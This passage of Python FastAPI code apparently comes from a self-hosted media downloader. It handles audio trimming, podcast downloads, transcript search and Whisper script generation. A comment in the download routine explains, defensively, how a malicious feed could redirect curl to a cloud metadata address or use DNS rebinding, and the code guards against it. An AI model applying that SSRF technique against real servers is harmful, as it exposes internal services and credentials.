            md.append(f"\n**Transkript:**\n\n{rec['transcript']}\n")

    md_path.write_text("\n".join(md), encoding="utf-8")
    json_path.write_text(json.dumps(records, ensure_ascii=False, indent=2), encoding="utf-8")
    batches[batch_id]["metadata_md"] = str(md_path)
    batches[batch_id]["metadata_json"] = str(json_path)
    batches[batch_id]["metadata_name"] = md_path.name


@app.get("/api/job/{job_id}")
async def job_status(job_id: str, request: Request, user: dict = Depends(current_user)):
    job = jobs.get(job_id)
    if not job or job.get("user_id") != user["id"]:
        raise HTTPException(404, "Job not found")
    return _localized(request, job)


@app.get("/api/download-file/{job_id}")
async def download_file(job_id: str, user: dict = Depends(current_user)):
    job = jobs.get(job_id)
    if not job or job.get("user_id") != user["id"] or job.get("status") != "done":
        raise HTTPException(404, "File not ready")
    paths = [Path(p) for p in job.get("filepaths", [job.get("filepath")]) if p]
    paths = [p for p in paths if p.exists()]
    if not paths:
        raise HTTPException(404, "File gone")
    if len(paths) == 1:
        fp = paths[0]
        return FileResponse(
            fp, media_type="application/octet-stream", filename=fp.name,
            headers={"Content-Disposition": content_disposition(fp.name)},
        )
    # Carousel/playlist job → zip the parts.
    import zipfile
    zip_path = TMP_DIR / f"{job_id}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as z:
        for p in paths:
            z.write(p, p.name)
    return FileResponse(
        zip_path, media_type="application/zip", filename=zip_path.name,
        headers={"Content-Disposition": content_disposition(zip_path.name)},
    )


# ── Audio trimming ────────────────────────────────────────────────────────────
# Cutting an intro off a podcast is the one job a downloader almost never does,
# and it is the reason people open an audio editor afterwards. ClipGrab cannot
# do it; neither can any of the self-hosted alternatives.
#
# Division of labour: the server fetches the audio and performs the cut, the
# browser draws the waveform from the file it already downloaded. Computing
# peaks server-side would mean a round trip for every scrub, and the browser
# has the decoded samples anyway.

trims: dict[str, dict] = {}

# ClipGrab hardcodes MP3 to 256 kbit/s — there is a settings tab for it in the
# source, but it is removed at runtime with a `//fixme!`. Offering the choice
# is a low bar to clear.
AUDIO_BITRATES = ["320", "256", "192", "160", "128", "96"]
TRIM_MAX_MINUTES = int(os.environ.get("TRIM_MAX_MINUTES", "180"))


def _trim_dir(trim_id: str) -> Path:
    return DOWNLOAD_DIR / f"trim_{trim_id}"


async def _trim_prepare(trim_id: str, url: str, cookies: str = ""):
    """Fetch audio once, at good quality — the cut re-encodes from this, so
    starting from a lossy 96k file would bake that in."""
    rec = trims[trim_id]
    out = _trim_dir(trim_id)
    out.mkdir(parents=True, exist_ok=True)
    try:
        rec.update(status="running", stage="Ton wird geladen…")
        ck = None
        if cookies.strip():
            ck = out / "ck.txt"
            ck.write_text(cookies.strip())
        args = (["--cookies", str(ck)] if ck else []) + [
            "-f", "bestaudio/best", "-x",
            "--audio-format", "mp3", "--audio-quality", "0",
            "--no-playlist", *_yt_extractor_args(bool(ck)),
            "--print", "after_move:%(title)s",
            "-o", str(out / "source.%(ext)s"), "--", url,
        ]
        code, stdout, err = await run_ytdlp(args)
        if ck:
            ck.unlink(missing_ok=True)

        src = out / "source.mp3"
        if code != 0 or not src.exists():
            raise RuntimeError((err or "Ton konnte nicht geladen werden.")[:300])

        dur = await _media_duration(src)
        if dur > TRIM_MAX_MINUTES * 60:
            src.unlink(missing_ok=True)
            raise RuntimeError(f"Länger als {TRIM_MAX_MINUTES} Minuten — zu groß fürs Zuschneiden.")

        meta = await _fetch_light_meta(url, cookies) if _is_youtube(url) else {}
        rec.update(
            status="ready", stage="",
            duration=dur,
            title=(stdout.strip().splitlines() or [""])[-1] or meta.get("title", ""),
            # Chapters become clickable jump targets: "start at chapter 2" is
            # usually what "cut the intro" actually means.
            chapters=[c for c in (meta.get("chapters") or [])
                      if isinstance(c, dict) and "start_time" in c],
            size=src.stat().st_size,
        )
    except Exception as e:
        rec.update(status="error", stage="", error=str(e)[:300])
        log_error("trim", str(e)[:300], url)


@app.post("/api/trim")
async def trim_start(background_tasks: BackgroundTasks, url: str = Form(...),
                     user: dict = Depends(current_user)):
    # require_http_url statt einer Leerprüfung: die URL geht als Argument an
    # yt-dlp, und alles was mit „-" beginnt, liest yt-dlp als Option.
    url = require_http_url(url)
    # Trimming fetches the audio of a video, which for YouTube is the same
    # download the media switch governs.
    if _is_youtube(url) and not youtube_video_enabled():
        raise HTTPException(403, "YouTube-Medien sind aus. Transkripte funktionieren weiterhin.")
    # Same hourly budget as a batch: a trim is a full audio download plus a
    # re-encode, and nothing else stopped a loop from queuing hundreds.
    _batch_throttle(user["id"], 1)
    trim_id = str(uuid.uuid4())
    trims[trim_id] = {"status": "pending", "url": url, "user_id": user["id"],
                      "created": datetime.now().isoformat(), "stage": "Wird vorbereitet…"}
    cookies = _merged_cookie_jar(user["id"])
    background_tasks.add_task(_trim_prepare, trim_id, url, cookies)
    return {"trim_id": trim_id}


def _own_trim(trim_id: str, user: dict) -> dict:
    rec = trims.get(trim_id)
    if not rec or rec.get("user_id") != user["id"]:
        raise HTTPException(404, "Nicht gefunden.")
    return rec


@app.get("/api/trim/{trim_id}")
async def trim_status(trim_id: str, request: Request, user: dict = Depends(current_user)):
    rec = _own_trim(trim_id, user)
    return _localized(request, {k: v for k, v in rec.items() if k not in ("user_id", "url")})


@app.get("/api/trim/{trim_id}/audio")
async def trim_audio(trim_id: str, user: dict = Depends(current_user)):
    """The full file, for the browser to decode and draw. Range requests come
    from FileResponse, so seeking in the <audio> element works."""
    _own_trim(trim_id, user)
    src = _trim_dir(trim_id) / "source.mp3"
    if not src.exists():
        raise HTTPException(404, "Ton nicht mehr vorhanden.")
    return FileResponse(src, media_type="audio/mpeg", filename="source.mp3",
                        headers={"Content-Disposition": content_disposition("source.mp3")})


@app.post("/api/trim/{trim_id}/cut")
async def trim_cut(trim_id: str, start: float = Form(0.0), end: float = Form(0.0),
                   bitrate: str = Form("192"), fade: float = Form(0.0),
                   fmt: str = Form("mp3"), user: dict = Depends(current_user)):
    rec = _own_trim(trim_id, user)
    src = _trim_dir(trim_id) / "source.mp3"
    if rec.get("status") != "ready" or not src.exists():
        raise HTTPException(409, "Noch nicht bereit.")

    dur = float(rec.get("duration") or 0)
    start = max(0.0, min(start, dur))
    end = dur if end <= 0 else min(end, dur)
    if end - start < 0.5:
        raise HTTPException(400, "Der Ausschnitt ist zu kurz.")
    if bitrate not in AUDIO_BITRATES:
        raise HTTPException(400, "Unbekannte Bitrate.")
    if fmt not in ("mp3", "m4a", "wav"):
        raise HTTPException(400, "Unbekanntes Format.")

    length = end - start
    out = _trim_dir(trim_id) / f"cut.{fmt}"
    out.unlink(missing_ok=True)

    # Re-encode rather than stream-copy. Copying only cuts on frame boundaries,
    # which lands up to ~26 ms off — audible as a clipped syllable at the very
    # point the user was being precise about. Audio re-encodes in seconds.
    filters = []
    fade = max(0.0, min(fade, length / 2))
    if fade > 0:
        # A hard cut mid-waveform clicks. The fade is short enough not to eat
        # content but long enough to remove the step.
        filters.append(f"afade=t=in:st=0:d={fade:.3f}")
        filters.append(f"afade=t=out:st={max(0.0, length - fade):.3f}:d={fade:.3f}")

    codec = {"mp3": ["-c:a", "libmp3lame", "-b:a", f"{bitrate}k"],
             "m4a": ["-c:a", "aac", "-b:a", f"{bitrate}k"],
             "wav": ["-c:a", "pcm_s16le"]}[fmt]
    cmd = ["ffmpeg", "-y", "-hide_banner", "-loglevel", "error",
           "-ss", f"{start:.3f}", "-t", f"{length:.3f}", "-i", str(src)]
    if filters:
        cmd += ["-af", ",".join(filters)]
    cmd += codec + [str(out)]

    code, _, err = await run_cmd(cmd)
    if code != 0 or not out.exists():
        log_error("trim-cut", (err or "")[:300], rec.get("url", ""))
        raise HTTPException(500, "Schnitt fehlgeschlagen.")

    rec["cut"] = {"start": start, "end": end, "fmt": fmt,
                  "size": out.stat().st_size, "seconds": round(length, 2)}
    return {"ok": True, **rec["cut"]}


@app.get("/api/trim/{trim_id}/download")
async def trim_download(trim_id: str, user: dict = Depends(current_user)):
    rec = _own_trim(trim_id, user)
    cut = rec.get("cut")
    if not cut:
        raise HTTPException(404, "Noch nichts geschnitten.")
    out = _trim_dir(trim_id) / f"cut.{cut['fmt']}"
    if not out.exists():
        raise HTTPException(404, "Datei nicht mehr vorhanden.")
    stem = _safe_filename(rec.get("title") or "ausschnitt") or "ausschnitt"
    # The stem is the video title — umlauts and emoji are the normal case.
    return FileResponse(out, media_type="application/octet-stream",
                        filename=f"{stem}.{cut['fmt']}",
                        headers={"Content-Disposition":
                                 content_disposition(f"{stem}.{cut['fmt']}")})


# ── Podcasts ──────────────────────────────────────────────────────────────────
# A different kind of source, and a much simpler one: an RSS feed exists so
# that software fetches it, the enclosure URL is the file the publisher put
# there for downloading, and roughly a quarter of shows publish a transcript
# outright. None of the care the video path needs applies.
#
# Division of labour follows the rest of the tool: the server resolves,
# fetches and packages; Whisper runs on the person's own machine, because this
# VPS carries a wiki, a git forge and client sites, and has no swap.

podcasts: dict[str, dict] = {}

PODCAST_MAX_EPISODES = int(os.environ.get("PODCAST_MAX_EPISODES", "25"))
# Mono at 48 kbit/s is about 21 MB an hour and perfectly good for speech —
# both for listening in a car and for feeding to Whisper.
PODCAST_AUDIO_KBPS = os.environ.get("PODCAST_AUDIO_KBPS", "48")
PODCAST_LONG_KBPS = os.environ.get("PODCAST_LONG_KBPS", "32")
PODCAST_LONG_MINUTES = int(os.environ.get("PODCAST_LONG_MINUTES", "90"))
# A ceiling for a single download. Without one, SSRF or a mislabelled
# enclosure can fill the disk — and a four-hour episode is not what anyone
# meant to fetch.
PODCAST_MAX_BYTES = int(os.environ.get("PODCAST_MAX_BYTES", str(900 * 1024 * 1024)))


def _podcast_dir(pid: str) -> Path:
    return DOWNLOAD_DIR / f"podcast_{pid}"


def _package_episodes(folder: Path) -> list[dict]:
    """Episode records from a finished package's manifest, for callers that
    only have the folder. Missing or broken manifest: no metadata, not an error."""
    try:
        data = json.loads((folder / "manifest.json").read_text(encoding="utf-8"))
        return [e for e in data.get("episodes", []) if isinstance(e, dict)]
    except Exception:
        return []


def _cite(hit: dict, ep: dict | None) -> tuple[str, str]:
    """A quotable line and, where possible, a link to the very moment.

    A hit is only useful in a text if the reader can check it, so the line
    carries show, episode, date and time in one place. Missing parts are left
    out rather than filled with placeholders: a citation that says
    "unbekannt" looks more authoritative than it is.
    """
    ep = ep or {}
    snippet = (hit.get("text") or "").strip()
    if len(snippet) > 160:
        snippet = snippet[:157].rstrip() + "…"
    d = podcast.parse_date(ep.get("date")) if ep.get("date") else None
    title = ep.get("title") or hit.get("episode", "")
    where = ", ".join(p for p in (ep.get("show") or "", title) if p)
    if d:
        where += f" ({d.strftime('%Y-%m-%d')})"
    if hit.get("at"):
        where += f", {hit['at']}"
    cite = f"“{snippet}” · {where}" if where else f"“{snippet}”"

    # Media fragments (#t=) are honoured by browsers for a direct audio file,
    # not by Spotify or a show's web page. So the time goes only onto the
    # enclosure; any other known link is returned as it is.
    link = ""
    audio = ep.get("audio") or ""
    if audio.startswith(("http://", "https://")):
        link = audio.split("#", 1)[0]
        if hit.get("seconds") is not None:
            link += f"#t={int(hit['seconds'])}"
    else:
        for key in ("source", "url", "link"):
            v = ep.get(key) or ""
            if isinstance(v, str) and v.startswith(("http://", "https://")):
                link = v
                break
    return cite, link


def search_transcripts(folder: Path, query: str, limit: int = 40,
                       episodes: list[dict] | None = None) -> list[dict]:
    """Welche Folge hat über X gesprochen — und an welcher Stelle.

    Transkripte zu erzeugen und sie dann in einem Ordner liegen zu lassen
    löst nur die halbe Aufgabe. Wer zwanzig Folgen an einem Tag holt, sucht
    danach nicht die Datei, sondern die Stelle.

    Gesucht wird ausschließlich in den Dateien dieses Pakets. Das ist kein
    Index und keine Historie: die Dateien liegen ohnehin da, verschwinden mit
    der Aufbewahrungsfrist, und es entsteht nichts, was den Lauf überdauert.
    Ein serverseitiger Index über alles, was jemand je geladen hat, wäre
    genau das Verzeichnis, das dieses Werkzeug nicht führen will.

    Bevorzugt wird die VTT-Fassung, weil sie Zeitmarken trägt — der Treffer
    ist dann nicht nur „in dieser Folge", sondern „ab 23:14". Nur wenn keine
    da ist, wird der Fließtext zeilenweise durchsucht.

    Jeder Treffer trägt zusätzlich `cite` (zitierfertige Zeile) und `link`
    (Audio mit #t=Sekunden, sonst die bekannte Folgen-URL, sonst leer). Die
    Folgendaten kommen aus `episodes` oder, wenn nicht übergeben, aus dem
    manifest.json des Pakets.
    """
    hits = _search_hits(folder, query, limit)
    if not hits:
        return hits
    if episodes is None:
        episodes = _package_episodes(folder)
    by_slug = {podcast.episode_slug(e): e for e in episodes or []
               if e.get("status") != "nicht_aufgeloest"}
    for h in hits:
        h["cite"], h["link"] = _cite(h, by_slug.get(h["episode"]))
    return hits


def _search_hits(folder: Path, query: str, limit: int) -> list[dict]:
    terms = [t for t in re.split(r"\s+", (query or "").strip().lower()) if t]
    if not terms or not folder.is_dir():
        return []

    def hit(text: str) -> bool:
        low = text.lower()
        return all(t in low for t in terms)

    out: list[dict] = []
    for ep_dir in sorted(p for p in folder.iterdir() if p.is_dir()):
        vtt = next(iter(sorted(ep_dir.glob("*_Transkript.vtt"))), None)
        txt = next(iter(sorted(ep_dir.glob("*_Transkript.txt"))), None)
        segments: list[dict] = []
        if vtt:
            try:
                segments = vtt_to_segments(vtt.read_text(encoding="utf-8", errors="replace"))
            except Exception:
                segments = []
        if segments:
            for s in segments:
                if hit(s.get("text", "")):
                    out.append({"episode": ep_dir.name,
                                "at": _clock(s.get("start", 0)),
                                "seconds": int(s.get("start", 0)),
                                "text": s["text"].strip()[:300]})
                    if len(out) >= limit:
                        return out
        elif txt:
            try:
                lines = txt.read_text(encoding="utf-8", errors="replace").splitlines()
            except Exception:
                continue
            for line in lines:
                if line.strip() and hit(line):
                    # Ohne Zeitmarke keine erfinden: „at" bleibt leer, statt
                    # eine Zeilennummer als Zeit auszugeben.
                    out.append({"episode": ep_dir.name, "at": "", "seconds": None,
                                "text": line.strip()[:300]})
                    if len(out) >= limit:
                        return out
    return out


async def _fetch_to_file(url: str, dest: Path) -> bool:
    """Download with resume and retries.

    Podcast hosters are not CDNs with nine nines, and a half-written file that
    looks complete is worse than a failure: Whisper would transcribe the first
    twenty minutes and report success.
    """
    # The URL came from a feed, so it gets the same check as everything else
    # the resolver touches — curl speaks file://, dict:// and gopher:// too,
    # and -o would happily write whatever it reads.
    #
    # Checking only the first URL was not enough. With -L curl followed
    # redirects on its own, and a feed under someone else's control can
    # answer 302 → http://169.254.169.254/… (cloud metadata) or any service
    # on the box's private network. The check also resolved the name once and
    # curl resolved it again — a DNS answer with TTL 0 can differ between the
    # two (rebinding). So redirects are followed here, one hop at a time:
    # every hop is resolved and checked, and curl is pinned to exactly that
    # address with --resolve, so the address checked is the address used.
    import time as _time
    from urllib.parse import urlparse as _urlparse
    deadline = _time.monotonic() + 900
    current = url
    err = ""
    for _hop in range(5):                      # first request + 4 redirects
        # getaddrinfo blocks; off the event loop like every other lookup.
        checked, ip = await asyncio.to_thread(podcast._resolve_checked, current)
        if not checked or not ip:
            log_error("podcast-download", "Zieladresse nicht erlaubt", current)
            dest.unlink(missing_ok=True)
            return False
        p = _urlparse(checked)
        port = p.port or (443 if p.scheme == "https" else 80)
        host = f"[{p.hostname}]" if ":" in p.hostname else p.hostname
        pin = f"[{ip}]" if ":" in ip else ip
        remaining = int(deadline - _time.monotonic())
        if remaining <= 0:
            log_error("podcast-download", "Zeitlimit erreicht", url)
            dest.unlink(missing_ok=True)
            return False
        code, out, err = await run_cmd([
            "curl", "-fsS", "--proto", "=http,https", "--max-redirs", "0",
            "--resolve", f"{host}:{port}:{pin}",
            "--max-filesize", str(PODCAST_MAX_BYTES),
            "--retry", "5", "--retry-all-errors", "--retry-delay", "2",
            "-C", "-", "--max-time", str(remaining), "-A", podcast.UA,
            "-w", "%{http_code}\\n%{redirect_url}",
            "-o", str(dest), "--", checked,
        ])
        status, _, location = (out or "").partition("\n")
        if code == 0 and status.strip().startswith("3"):
            # The redirect body landed in dest; it is not audio, and -C -
            # would otherwise resume the next hop on top of it.
            dest.unlink(missing_ok=True)
            location = location.strip()
            if not location:
                break
            current = location
            continue
        break
    else:
        log_error("podcast-download", "Zu viele Weiterleitungen", url)
        dest.unlink(missing_ok=True)
        return False
    if code != 0 or not dest.exists() or dest.stat().st_size < 1024:
        log_error("podcast-download", (err or "")[:200], url)
        return False
    return True


async def _shrink_audio(src: Path, dest: Path, duration_s: int) -> bool:
    """Re-encode to small mono speech audio.

    -vn is not optional. Several hosters embed the episode artwork as a second
    stream; without it ffmpeg carries the picture across and the file comes out
    twice the size — 30 MB instead of 14 for a 39-minute episode.
    """
    kbps = (PODCAST_LONG_KBPS if duration_s > PODCAST_LONG_MINUTES * 60
            else PODCAST_AUDIO_KBPS)
    code, _, err = await run_cmd([
        "ffmpeg", "-y", "-hide_banner", "-loglevel", "error",
        "-i", str(src),
        "-vn",                       # drop the embedded artwork — see above
        "-ac", "1", "-ar", "44100",
        "-c:a", "libmp3lame", "-b:a", f"{kbps}k",
        "-threads", "2",             # this box has other tenants
        str(dest),
    ])
    if code != 0 or not dest.exists():
        log_error("podcast-shrink", (err or "")[:200], str(src))
        return False
    return True


def _whisper_prompt(ep: dict) -> str:
    """Seed Whisper with the names it would otherwise mangle.

    Measured on real episodes: uncommon surnames came back misspelled, each
    time differently. Feeding the show name, host and the names from
    the notes fixes most of it. Kept short — past roughly 200 characters
    Whisper starts echoing fragments of the prompt into the transcript.
    """
    bits = [ep.get("show", ""), ep.get("author", "")]
    notes = ep.get("shownotes") or ""
    # Capitalised word pairs in the notes are usually people — except at the
    # start of a German sentence, where any word is capitalised. Without this
    # the prompt fills up with "Mit Gregor" and "Zu Gast".
    STOP = {"mit", "zu", "der", "die", "das", "ein", "eine", "einem", "einer",
            "im", "in", "am", "bei", "für", "von", "und", "wie", "was", "warum",
            "heute", "neu", "unser", "unsere", "diese", "dieser", "alle", "wir",
            "ihr", "es", "gast", "folge", "thema", "firma", "episode"}
    # Split on punctuation first: a full stop right after a surname would
    # otherwise end the run one word early, and "Gregor" alone is useless.
    for chunk in re.split(r"[.,;:!?()\[\]\n]", notes):
        for run in re.findall(r"\b(?:[A-ZÄÖÜ][a-zäöüß]+(?:\s+|$)){2,4}", chunk + " "):
            words = run.split()
            while words and words[0].lower() in STOP:
                words.pop(0)        # "Mit Ada Lovelace" → "Ada Lovelace"
            while words and words[-1].lower() in STOP:
                words.pop()
            # A lone first name is worse than nothing: Whisper still mangles
            # the surname, and the prompt slot is spent.
            if len(words) >= 2:
                bits.append(" ".join(words))
        if len(bits) > 10:
            break
    if ep.get("hints"):
        bits.append(str(ep["hints"]))
    seen, out = set(), []
    for b in bits:
        b = (b or "").strip()
        if b and b.lower() not in seen:
            seen.add(b.lower())
            out.append(b)
    prompt = ", ".join(out)
    return prompt[:200].rstrip(", ")


def _clean_glossary(raw: str) -> str:
    """The user's own list of names and terms, made safe for initial_prompt.

    Same 200-character ceiling as _whisper_prompt and for the same reason:
    past that Whisper starts echoing prompt fragments into the transcript.
    Line breaks become commas so a pasted list reads as one.
    """
    text = re.sub(r"[\x00-\x1f]+", ", ", raw or "")
    text = re.sub(r"\s+", " ", text)
    text = re.sub(r"(,\s*)+", ", ", text).strip(" ,")
    return text[:200].rstrip(", ")


def build_podcast_whisper_script(episodes: list[dict], os_kind: str = "mac") -> str:
    """A script the person runs on their own machine.

    Every rule here was learned the hard way and is in the wiki: no `set -e`
    (one failing episode must not abandon the rest), no array indices (zsh
    counts from one), variables always braced, and anything over 45 minutes
    gets split — a 103-minute episode died twice on a machine with 8 GB.
    """
    # "needs a transcript" means: resolved, nothing in the feed, and not
    # already transcribed here. The last clause matters on the desktop, where
    # the work may have happened during packaging — a script that redoes it
    # would burn an hour for nothing.
    pending = [e for e in episodes
               if e.get("status") in ("ok", "unsicher")
               and not e.get("transcripts")
               and not e.get("transcript_source")]
    if not pending:
        return ""

    if os_kind == "windows":
        lines = [
            "# Transkripte erzeugen — Windows (PowerShell)",
            "# Einmalig:  winget install astral-sh.uv",
            "#            uv tool install whisper-ctranslate2",
            "#            ffmpeg muss im PATH sein: winget install Gyan.FFmpeg",
            "",
            "$ErrorActionPreference = 'Continue'   # eine kaputte Folge stoppt den Rest nicht",
            "Set-Location -Path $PSScriptRoot",
            "",
            "# small statt large: ohne Grafikkarte ist alles darüber keine Geduldsfrage",
            "# mehr, sondern eine Übernachtung.",
            "$model = 'small'",
            "",
        ]
        for ep in pending:
            slug, prompt = podcast.episode_slug(ep), _whisper_prompt(ep)
            lang = safe_lang(ep.get("language"))
            lines += [
                f"Write-Host {ps('→ ' + slug)}",
                f"$audio = Join-Path {ps(slug)} {ps(slug + '.mp3')}",
                "if (Test-Path $audio) {",
                f"  whisper-ctranslate2 $audio --model $model --language {lang} "
                f"--output_format all --output_dir {ps(slug)} --compute_type int8 "
                f"--initial_prompt {ps(prompt)}",
                "} else { Write-Host '  Datei fehlt, übersprungen' }",
                "",
            ]
        lines.append("Write-Host 'Fertig.'")
        return "\n".join(lines)

    lines = [
        "#!/bin/zsh",
        "# Transkripte erzeugen — macOS",
        "# Einmalig:  brew install uv ffmpeg",
        "#            uv tool install whisper-ctranslate2",
        "#            uv tool install mlx-whisper      # Apple Silicon, deutlich schneller",
        "",
        "# Kein `set -e`: eine Folge, die nicht geht, darf die anderen nicht mitnehmen.",
        'cd "${0:a:h}" || exit 1',
        "",
        "# Modell nach Maschine, ohne zu fragen — und sagen, was gewählt wurde.",
        'if [[ "$(uname -m)" == "arm64" ]] && command -v mlx_whisper >/dev/null 2>&1; then',
        '  ENGINE=mlx; MODEL="mlx-community/whisper-large-v3-turbo"',
        'elif command -v whisper-ctranslate2 >/dev/null 2>&1; then',
        '  ENGINE=ct2; MODEL=small',
        "else",
        '  echo "Kein Whisper gefunden. Einmalig:"',
        '  echo "  brew install uv ffmpeg && uv tool install whisper-ctranslate2"',
        "  exit 1",
        "fi",
        'echo "Engine: ${ENGINE} · Modell: ${MODEL}"',
        "",
        "# Über 45 Minuten stückeln. Grund: eine 103-Minuten-Folge ist auf einer",
        "# Maschine mit 8 GB zweimal mitten im Lauf gestorben.",
        "SPLIT_AFTER=2700",
        "",
    ]
    for ep in pending:
        # Every one of these is quoted, because every one of them can come
        # from a feed: slug from the show and episode title, prompt from the
        # author and show notes, lang from <language> or an order sheet.
        slug = podcast.episode_slug(ep)
        q_slug = sh(slug)
        q_prompt = sh(_whisper_prompt(ep))
        q_parts = sh(f"{slug}/teile")
        lang = safe_lang(ep.get("language"))
        minutes = int(ep.get("duration_s") or 0) // 60
        lines += [
            f'echo {sh("→ " + slug)}',
            f'AUDIO={sh(f"{slug}/{slug}.mp3")}',
            'if [ ! -f "${AUDIO}" ]; then echo "  Datei fehlt, übersprungen"; else',
            '  DUR=$(ffprobe -v error -show_entries format=duration -of '
            'default=noprint_wrappers=1:nokey=1 "${AUDIO}" 2>/dev/null | cut -d. -f1)',
            '  case "${DUR}" in ""|N/A) DUR=0 ;; esac',
            '  if [ "${DUR}" -gt "${SPLIT_AFTER}" ]; then',
            f'    echo {sh(f"  {minutes} Min — wird gestückelt")}',
            f'    mkdir -p {q_parts}',
            '    ffmpeg -y -hide_banner -loglevel error -i "${AUDIO}" -vn -ac 1 -ar 16000 \\',
            f'      -f segment -segment_time 1200 {sh(f"{slug}/teile/teil_%03d.wav")}',
            f'    for part in {q_parts}/teil_*.wav; do',
            '      [ -e "${part}" ] || continue',
            '      if [ "${ENGINE}" = "mlx" ]; then',
            f'        mlx_whisper "${{part}}" --model "${{MODEL}}" --language {lang} \\',
            f'          --output-format all --output-dir {q_parts} --initial-prompt {q_prompt}',
            "      else",
            f'        whisper-ctranslate2 "${{part}}" --model "${{MODEL}}" --language {lang} \\',
            f'          --output_format all --output_dir {q_parts} --compute_type int8 \\',
            f'          --initial_prompt {q_prompt}',
            "      fi",
            "    done",
            f'    echo {sh(f"  Teile liegen in {slug}/teile — Zeitmarken je Teil ab 0")}',
            "  else",
            '    if [ "${ENGINE}" = "mlx" ]; then',
            f'      mlx_whisper "${{AUDIO}}" --model "${{MODEL}}" --language {lang} \\',
            f'        --output-format all --output-dir {q_slug} --initial-prompt {q_prompt}',
            "    else",
            f'      whisper-ctranslate2 "${{AUDIO}}" --model "${{MODEL}}" --language {lang} \\',
            f'        --output_format all --output_dir {q_slug} --compute_type int8 \\',
            f'        --initial_prompt {q_prompt}',
            "    fi",
            "  fi",
            "fi",
            "",
        ]
    lines += [
        "# Aus den SRT-Dateien eine Fassung mit [mm:ss] je Zeile — das ist die,",
        "# mit der man Zitate belegt.",
        "python3 - <<'PY'",
        "import glob, re, pathlib",
        "for srt in glob.glob('*/*.srt') + glob.glob('*/teile/*.srt'):",
        "    out, stamp = [], ''",
        "    for line in pathlib.Path(srt).read_text(encoding='utf-8', errors='replace').splitlines():",
        "        m = re.match(r'(\\d\\d):(\\d\\d):(\\d\\d)[,.]\\d+ -->', line)",
        "        if m:",
        "            h, mi, s = (int(x) for x in m.groups())",
        "            stamp = f'[{h*60+mi:02d}:{s:02d}]'",
        "        elif line.strip() and not line.strip().isdigit():",
        "            out.append(f'{stamp} {line.strip()}' if stamp else line.strip())",
        "            stamp = ''",
        "    pathlib.Path(srt).with_suffix('.zeitmarken.txt').write_text(",
        "        '\\n'.join(out) + '\\n', encoding='utf-8')",
        "    print('  ' + srt.replace('.srt', '.zeitmarken.txt'))",
        "PY",
        "",
        'echo "Fertig."',
    ]
    return "\n".join(lines)


def episode_transcript_md(ep: dict, segments: list[dict], source: str = "") -> str:
    """A transcript as a Markdown file a person or an assistant can read on
    its own: where it came from on top, then paragraphs with time marks.

    Labels are English regardless of the UI language: the file leaves the app
    (ZIP, MCP, someone's notes folder) and is read by people and assistants
    that never saw the language switch. One fixed vocabulary also keeps it
    parseable by whoever reads many of them.
    """
    lines = [f"# {ep.get('title') or 'Transcript'}", ""]
    for label, val in (("Show", ep.get("show")), ("Date", ep.get("date")),
                       ("Link", ep.get("link") or ep.get("source")),
                       ("Transcript source", source or ep.get("transcript_source"))):
        if val:
            lines.append(f"- **{label}:** {val}")
    lines += ["", "---", ""]
    lines.append(segments_to_timestamped(segments))
    return "\n".join(lines).rstrip() + "\n"


async def _podcast_transcribe_local(rec: dict, ep: dict, folder: Path,
                                    slug: str, files: list[str]) -> bool:
    """Transcribe an episode here, on this machine.

    Only in LOCAL_MODE, and the distinction is not a policy preference. On the
    VPS this is excluded outright — it has no swap and carries a wiki, a git
    forge and client sites. On a laptop the premise inverts: the machine that
    would run the handed-over script *is* this machine, and sending someone a
    script to double-click when the work could just happen is friction for its
    own sake.

    A server whose operator knows it can carry the load opts in with
    PODCAST_SERVER_WHISPER. That path keeps the server's length ceiling: a
    three-hour episode would hold the only Whisper slot for an hour while
    every other request waits behind it.
    """
    if not ((LOCAL_MODE or PODCAST_SERVER_WHISPER) and WHISPER_ENABLED):
        return False

    audio = next((folder / f for f in files
                  if (folder / f).suffix.lower() in (".mp3", ".m4a", ".wav")), None)
    if not audio or not audio.exists():
        return False

    if not LOCAL_MODE:
        dur = ep.get("duration_s") or await _media_duration(audio)
        if not dur or dur > WHISPER_MAX_MINUTES * 60:
            return False

    minutes = max(1, int((ep.get("duration_s") or 0) // 60))
    rec["stage"] = f"Transkript wird erzeugt (~{minutes} Min Material)…"
    try:
        segments, lang = await _whisper_segments(audio, ep.get("language", "de"))
    except Exception as e:
        log_error("podcast-whisper", str(e)[:200], ep.get("link", ""))
        return False
    if not segments:
        return False

    # Same set of formats the feed-supplied transcripts get, so a package is
    # uniform regardless of where its text came from.
    for suffix, body in (
        ("txt", segments_to_text(segments)),
        ("zeitmarken.txt", segments_to_timestamped(segments)),
        ("srt", segments_to_srt(segments)),
        ("vtt", segments_to_vtt(segments)),
        ("md", episode_transcript_md(ep, segments, f"Whisper ({WHISPER_MODEL})")),
    ):
        dest = folder / f"{slug}_Transkript.{suffix}"
        dest.write_text(body, encoding="utf-8")
        files.append(dest.name)

    # Mark the provenance. Whisper mishears proper nouns, so anyone quoting
    # from this needs to know which kind of transcript they are holding.
    where = "lokal" if LOCAL_MODE else "server"
    ep["transcript_source"] = f"whisper-{where} ({WHISPER_MODEL})"
    ep["transcript_language"] = lang or ep.get("language", "de")
    return True


async def _podcast_job(pid: str, items: list, want_audio: str):
    """Resolve, then fetch what the feed offers."""
    rec = podcasts[pid]
    out = _podcast_dir(pid)
    out.mkdir(parents=True, exist_ok=True)
    try:
        rec.update(status="running", stage="Folgen werden aufgelöst…", done=0)
        episodes = await podcast.resolve_many(items, feeds=rec.get("feeds"))
        rec["episodes"] = episodes
        rec["total"] = len(episodes)

        for i, ep in enumerate(episodes, 1):
            if ep.get("status") == "nicht_aufgeloest":
                continue
            slug = podcast.episode_slug(ep)
            folder = out / slug
            folder.mkdir(parents=True, exist_ok=True)
            files = []

            rec["stage"] = f"{i}/{len(episodes)} · {ep.get('title', '')[:60]}"
            (folder / f"{slug}_Shownotes.md").write_text(
                podcast.shownotes_markdown(ep), encoding="utf-8")
            files.append(f"{slug}_Shownotes.md")

            # A published transcript beats anything we could produce, and
            # roughly a quarter of shows have one.
            for t in ep.get("transcripts", []):
                ext = {"vtt": "vtt", "srt": "srt", "json": "json",
                       "plain": "txt", "html": "html"}.get(t.get("type", ""), "txt")
                dest = folder / f"{slug}_Transkript.{ext}"
                if await _fetch_to_file(t["url"], dest):
                    files.append(dest.name)
                    # Normalise VTT to plain text as well — that is the form
                    # people actually read.
                    if ext == "vtt":
                        try:
                            segs = vtt_to_segments(dest.read_text(encoding="utf-8",
                                                                  errors="replace"))
                            if segs:
                                txt = folder / f"{slug}_Transkript.txt"
                                txt.write_text(segments_to_text(segs), encoding="utf-8")
